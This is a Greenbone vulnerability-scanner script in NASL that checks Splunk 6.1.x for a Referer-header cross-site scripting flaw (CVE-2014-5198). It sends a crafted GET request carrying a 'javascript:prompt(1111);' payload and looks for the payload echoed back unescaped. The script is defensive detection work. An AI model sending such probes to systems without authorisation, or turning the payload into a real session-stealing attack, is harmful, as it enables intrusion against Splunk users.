# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:splunk:splunk";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804479");
  script_version("2023-07-27T05:05:09+0000");
  script_cve_id("CVE-2014-5198");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2023-07-27 05:05:09 +0000 (Thu, 27 Jul 2023)");
  script_tag(name:"creation_date", value:"2014-09-08 13:34:59 +0530 (Mon, 08 Sep 2014)");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Splunk Referer Header Cross-Site Scripting Vulnerability");

  script_tag(name:"summary", value:"Splunk is prone to a cross-site scripting (XSS) vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET
  request and check whether it is able to read cookie or not.");

  script_tag(name:"insight", value:"Input passed via the Referer header
  in HTTP GET is not properly sanitized before being returned to the user");

  script_tag(name:"impact", value:"Successful exploitation will allow
  attacker to execute arbitrary HTML and script code in a user's browser
  session in the context of an affected site.");

  script_tag(name:"affected", value:"Splunk Version 6.1.x before 6.1.3");

  script_tag(name:"solution", value:"Upgrade to version 6.1.3 or later.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/59940");
  script_xref(name:"URL", value:"http://www.splunk.com/view/SP-CAAAM9H");
  script_xref(name:"URL", value:"http://www.securitytracker.com/id/1030690");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/126813");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_dependencies("gb_splunk_detect.nasl");
  script_mandatory_keys("Splunk/installed");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"http://www.splunk.com/download");
  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if(!awPort = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:awPort)){
  exit(0);
}

if (dir == "/")
  dir = "";

url =  dir + "/en-US/app/";

## Request to check if vulnerability is exploited
req = string("GET ", url , " HTTP/1.1\r\n",
             "Host: ", get_host_name(),"\r\n",
             "Referer: javascript:prompt(1111);\r\n",
             "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.",
             "\r\n\r\n");

buf = http_keepalive_send_recv(port:awPort, data:req);

if(buf =~ 'javascript:prompt\\(1111\\);">javascript:prompt\\(1111\\);<' &&
          ">Return to Splunk home page<" >< buf )
{
  security_message(awPort);
  exit(0);
}

exit(0);
